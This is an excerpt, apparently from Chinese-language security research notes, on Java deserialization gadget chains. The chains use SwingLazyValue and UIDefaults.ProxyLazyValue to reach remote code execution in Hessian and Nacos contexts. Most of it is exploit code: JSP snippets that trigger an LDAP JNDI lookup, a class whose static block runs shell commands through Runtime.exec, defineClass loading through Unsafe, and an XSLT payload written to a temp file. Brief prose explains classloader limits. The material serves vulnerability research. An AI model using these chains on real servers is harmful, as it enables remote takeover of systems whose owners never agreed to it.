...
![img](https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477120461-b4e1133d-82ec-4fd4-ac48-c0b83d7e640c.png)
...
<%
    Object o = new sun.swing.SwingLazyValue("javax.naming.InitialContext", "doLookup", new Object[]{"ldap://xxxx"});
    UIDefaults uiDefaults = new UIDefaults();
    uiDefaults.put("aaa", o);
    uiDefaults.get("aaa");
%>
```
...
![img](https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477177921-672ce602-2e6d-40be-9c8d-2336ad73abbb.png)
...
<%@ page import="sun.swing.SwingLazyValue" %>
<%@ page import="javax.swing.*" %>
<%
    ...
    String[] command = new String[]{"sh", "-c", "open /"};
...
public class exp {
    ...
    static {
        ...
        try {
            bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()));
            String line;
        ...
        System.setProperty("ret", stringBuilder.toString());
    }
...
<%
    ...
    Object[] ags = new Object[]{invoke, new Object(), new Object[]{defineClass, unsafe, new Object[]{"exp", bcode, 0, bcode.length, null, null}}};

    SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", ags);
    SwingLazyValue swingLazyValue1 = new SwingLazyValue("exp", null, new Object[0]);

    Object[] keyValueList = new Object[]{"aaa", swingLazyValue};
    Object[] keyValueList1 = new Object[]{"bbb", swingLazyValue1};
...
<%@ page import="javassist.ClassClassPath" %>
<%@ page import="javax.swing.*" %>
<%
    ...
    String xslt = xsltTemplate.replace("<base64_payload>", base64Code).replace("<class_name>", "exp");
    System.setProperty("cmd", "open /");
    SwingLazyValue value1 = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{"/tmp/nacos_data_temp", xslt.getBytes()});
    ...
    uiDefaults.put("aaa", value1);
    uiDefaults2.put("bbb", value2);
    uiDefaults.get("aaa");
    uiDefaults2.get("bbb");
...
sun.swing.SwingLazyValue#createValue 因为ClassLoader的原因 ，在SwingLazyValue这里只能加载rt.jar 里面的类，而一些gadgets如jdk.nashorn.internal.codegen.DumpBytecode.dumpBytecode就位于nashorn.jar 里面

![img](https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477118542-acfc7a5f-a5b1-4c1a-b97f-f34073d265b1.png)

然后有师傅发现了另一个类：javax.swing.UIDefaults.ProxyLazyValue#createValue，这个类中的createValue的实现可以获取线程上下文中的类，应该来说兼容性更强。

![img](https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477120022-aedb6be5-6efd-4eef-b668-cc65621e60f4.png)
...
[https://flowerwind.github.io/2023/04/17/%E8%AE%B0%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98hessian%E4%B8%8D%E5%87%BA%E7%BD%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-md/](https://flowerwind.github.io/2023/04/17/记某次实战hessian不出网反序列化利用-md/)

https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html

[https://exp10it.cn/2023/06/nacos-jraft-hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rce-%E5%88%86%E6%9E%90/#javautilswritebytestofilename--systemload](https://exp10it.cn/2023/06/nacos-jraft-hessian-反序列化-rce-分析/#javautilswritebytestofilename--systemload)
